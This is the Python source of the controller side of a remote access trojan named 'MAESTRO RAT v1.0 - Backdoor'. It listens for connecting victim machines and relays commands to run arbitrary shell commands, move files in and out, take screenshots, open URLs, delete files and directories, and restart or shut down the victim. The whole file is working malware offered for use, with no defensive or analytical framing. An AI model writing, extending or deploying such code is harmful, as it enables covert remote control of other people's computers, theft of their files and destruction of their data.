import socket
import argparse
import threading
import os

commands = [
    ("exit", "Terminates the client connection."),
    ("execute", "Executes a specified terminal command on the client."),
    ("openfile [filename]", "Sends the content of the specified file from the server to the client."),
    ("deletefile [filename]", "Deletes the specified file."),
    ("deletedirectory [directory_name]", "Deletes the specified directory."),
    ("ls / dir", "Lists the contents of the current directory on the client."),
    ("cd [target_folder]", "Changes the working directory on the client."),
    ("createdirectory [folder_name]", "Creates a new directory."),
    ("createfile [filename]", "Creates a new file."),
    ("editfile [text] >> [filename]", "Appends the specified text to the end of the file."),
    ("whoami", "Returns the logged-in user on the client."),
    ("ifconfig", "Returns the network information of the client."),
    ("cpu", "Returns the CPU information of the client."),
    ("memory", "Returns the memory usage information of the client."),
    ("osinfo", "Returns the operating system information of the client."),
    ("browser [url]", "Opens the specified URL on the client."),
    ("upload", "Uploads a file from the client to the server."),
    ("download", "Downloads a file from the client to the client."),
    ("screenshot", "Takes a screenshot of the client's screen."),
    ("restart", "Restarts the client."),
    ("poweroff", "Shuts down the client."),
    ("cd [directory]", "Changes the directory."),
    ("clear", "Clears the terminal.")
]

print("{:<40} {}".format("Command", "Description"))
print("="*60)
for command, description in commands:
    print("{:<40} {}".format(command, description))


def handle_client(conn, addr):
    print(f"Connection received from: {addr}")

    try:
        while True:
            try:
                command = input("Enter command ('exit' to quit): ")
                conn.send(command.encode())
                
                if command == 'exit':
                    break
                
                elif not command:
                    continue
                    
                elif command == 'commandlist':
                    print("{:<40} {}".format("Command", "Description"))
                    print("="*60)
                    
                elif command == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')

                elif command == 'execute':
                    print("Please enter a command for 'execute':")
                    operation = input()
                    conn.send(operation.encode())
                    received_data = conn.recv(8192)
                    print(received_data.decode(errors='ignore'))
                
                elif command == 'upload':
                    filename = input("Enter the name of the file to upload: ")
                    conn.send(filename.encode())
                    try:
                        with open(filename, 'rb') as file:
                            while (data := file.read(8192)):
                                conn.send(data)
                            conn.send('UPLOAD_COMPLETE'.encode())
                            print(f'{filename} has been successfully uploaded.')
                    except FileNotFoundError:
                        print('ERROR: File not found.')
                                        
                elif command == 'download':
                    filename = input("Enter the name of the file to download: ")
                    conn.send(filename.encode())
                    with open(filename, 'wb') as file:
                        while True:
                            data = conn.recv(8192)
                            if data.endswith('DOWNLOAD_COMPLETE'.encode()):
                                data = data[:-len('DOWNLOAD_COMPLETE'.encode())]
                                file.write(data)
                                break
                            file.write(data)
                        print(f"{filename} has been successfully downloaded to your directory. [√]")
                                     
                elif command == 'screenshot':
                    with open('screenshothacked.png', 'wb') as file:
                        while True:
                            file_data = conn.recv(8192)
                            if file_data.endswith(b"screenshot_complete"):
                                file_data = file_data[:-len("screenshot_complete")]
                                file.write(file_data)
                                break
                            file.write(file_data)
                        print("Screenshot has been saved to your directory.")
                    
                elif command.startswith('browser'):
                    link = command.split(" ", 1)[1]
                    conn.send(link.encode())
                    result = conn.recv(8192).decode()
                    print(result)
                
                else:
                    received_data = conn.recv(8192)
                    print(received_data.decode(errors='ignore'))
                    
            except Exception as e:
                print(f"Error: {str(e)}")
                break

    except Exception as e:
        print(f"Connection error: {str(e)}")

    finally:
        conn.close()

def main():
    parser = argparse.ArgumentParser(description='MAESTRO RAT v1.0 - Backdoor')
    parser.add_argument('-lhost', dest='ip', help='Target IP address', required=True)
    parser.add_argument('-lport', dest='port', help='Target port number', required=True)
    args = parser.parse_args()

    ip = args.ip
    port = int(args.port)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((ip, port))
        s.listen(5)
        print(f"Listening on {ip}:{port}...")

        while True:
            try:
                conn, addr = s.accept()
                client_thread = threading.Thread(target=handle_client, args=(conn, addr))
                client_thread.start()
            except Exception as e:
                print(f"Connection acceptance error: {str(e)}")

if __name__ == "__main__":
    main()
